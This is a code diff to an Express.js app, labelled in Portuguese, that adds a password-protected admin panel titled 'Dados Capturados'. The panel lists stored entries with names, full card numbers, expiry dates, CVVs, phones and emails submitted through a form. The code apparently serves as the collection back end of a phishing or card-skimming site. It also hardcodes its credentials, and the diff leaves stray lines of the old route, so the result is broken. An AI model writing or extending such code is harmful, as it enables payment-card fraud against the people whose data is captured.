@@ -47,7 +47,49 @@ app.post('/submit-form', async (req, res) => {
 });
 
 // Painel admin protegido por senha e código
-app.get('/admin', async (req, res) => {
+
+app.get('/admin', (req, res) => {
+    res.send(`
+    <form method="POST" action="/admin" style="max-width:400px;margin:50px auto;padding:20px;border:1px solid #ccc;border-radius:8px;font-family:sans-serif">
+        <h2 style="text-align:center;">Painel Admin</h2>
+        <label>Senha:</label><br>
+        <input type="password" name="senha" required style="width:100%;padding:8px;margin-bottom:10px"><br>
+        <label>Código de autenticação:</label><br>
+        <input type="text" name="codigo" required style="width:100%;padding:8px;margin-bottom:10px"><br>
+        <button type="submit" style="background:#d63384;color:white;padding:10px 20px;border:none;border-radius:5px;cursor:pointer">Acessar</button>
+    </form>
+    `);
+});
+
+app.post('/admin', async (req, res) => {
+    const { senha, codigo } = req.body;
+    if (senha !== 'asap' || codigo !== 'b7be0c3d-d56c-4d6e-b9ef-97c72e5beaae') {
+        return res.status(401).send('Acesso negado');
+    }
+    try {
+        const dados = await FormData.find().sort({ dataEnvio: -1 });
+        let html = '<h1>Dados Capturados</h1>';
+        dados.forEach((item, index) => {
+            html += `
+                <div style="margin-bottom:20px;padding:10px;border:1px solid #ccc;border-radius:5px;">
+                    <strong>Entrada ${index + 1}</strong><br/>
+                    Nome: ${item.nome}<br/>
+                    Nº Cartão: ${item.numeroCartao}<br/>
+                    Validade: ${item.validade}<br/>
+                    CVV: ${item.cvv}<br/>
+                    Telefone: ${item.telefone}<br/>
+                    Email: ${item.email}<br/>
+                    Data: ${new Date(item.dataEnvio).toLocaleString()}<br/>
+                </div>
+            `;
+        });
+        res.send(html);
+    } catch (err) {
+        console.error('Erro ao buscar dados:', err);
+        res.status(500).send('Erro ao buscar dados.');
+    }
+});
+
     const senha = req.query.senha;
     const codigo = req.query.codigo;
 
